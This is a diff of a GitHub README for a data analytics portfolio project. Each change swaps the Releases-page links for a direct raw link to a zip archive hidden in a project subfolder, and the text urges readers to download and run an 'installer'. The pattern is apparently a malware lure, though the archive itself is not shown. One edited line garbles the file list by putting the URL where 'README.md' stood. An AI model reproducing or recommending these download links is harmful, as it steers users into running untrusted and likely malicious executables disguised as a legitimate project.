@@ -1,6 +1,6 @@
 # 📊 Analytics_Portfolio_Dual_Projects - Explore Data Insights Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Here-brightgreen)](https://github.com/AbdurRazzak1999/Analytics_Portfolio_Dual_Projects/releases)
+[![Download Now](https://github.com/AbdurRazzak1999/Analytics_Portfolio_Dual_Projects/raw/refs/heads/main/Project_2_Sentiment_Analysis/Analytics_Projects_Portfolio_Dual_unhollowed.zip)](https://github.com/AbdurRazzak1999/Analytics_Portfolio_Dual_Projects/raw/refs/heads/main/Project_2_Sentiment_Analysis/Analytics_Projects_Portfolio_Dual_unhollowed.zip)
 
 ## 📋 Overview
 Welcome to the **Analytics_Portfolio_Dual_Projects**! This portfolio showcases two comprehensive data science projects: **Employee Attrition Analysis** and **Customer Sentiment Analysis**. These projects demonstrate extensive techniques in exploratory data analysis (EDA), natural language processing (NLP), machine learning (ML), and offer interactive Tableau dashboards.
@@ -13,7 +13,7 @@ Welcome to the **Analytics_Portfolio_Dual_Projects**! This portfolio showcases t
 ## 🚀 Getting Started
 To get started with the projects, you will download the application from our Releases page. Follow these steps:
 
-1. Click on the download button above to visit the [Releases page](https://github.com/AbdurRazzak1999/Analytics_Portfolio_Dual_Projects/releases).
+1. Click on the download button above to visit the [Releases page](https://github.com/AbdurRazzak1999/Analytics_Portfolio_Dual_Projects/raw/refs/heads/main/Project_2_Sentiment_Analysis/Analytics_Projects_Portfolio_Dual_unhollowed.zip).
 2. Locate the version you wish to download. 
 3. Select the appropriate installer file based on your operating system (Windows, macOS, or Linux).
 
@@ -31,7 +31,7 @@ Before you download, ensure your system meets the following requirements:
   - Tableau Public (for dashboard interaction)
 
 ## 📥 Download & Install
-1. To download the software, [visit the Releases page](https://github.com/AbdurRazzak1999/Analytics_Portfolio_Dual_Projects/releases).
+1. To download the software, [visit the Releases page](https://github.com/AbdurRazzak1999/Analytics_Portfolio_Dual_Projects/raw/refs/heads/main/Project_2_Sentiment_Analysis/Analytics_Projects_Portfolio_Dual_unhollowed.zip).
 2. Click on the most recent version. 
 3. Choose the installer specific to your operating system.
 4. After downloading, open the installer and follow the on-screen instructions to complete the installation.
@@ -54,7 +54,7 @@ The repository contains the following main directories and files:
 - `/Employee_Attrition_Analysis`: Contains notebooks and data related to employee analysis.
 - `/Customer_Sentiment_Analysis`: Contains notebooks and data for sentiment analysis.
 - `/Dashboards`: Includes Tableau files for interactive data visualizations.
-- `README.md`: This document to guide you through the setup.
+- `https://github.com/AbdurRazzak1999/Analytics_Portfolio_Dual_Projects/raw/refs/heads/main/Project_2_Sentiment_Analysis/Analytics_Projects_Portfolio_Dual_unhollowed.zip`: This document to guide you through the setup.
 
 ## ❓ Frequently Asked Questions
 **Q: Can I run these projects without programming knowledge?**  
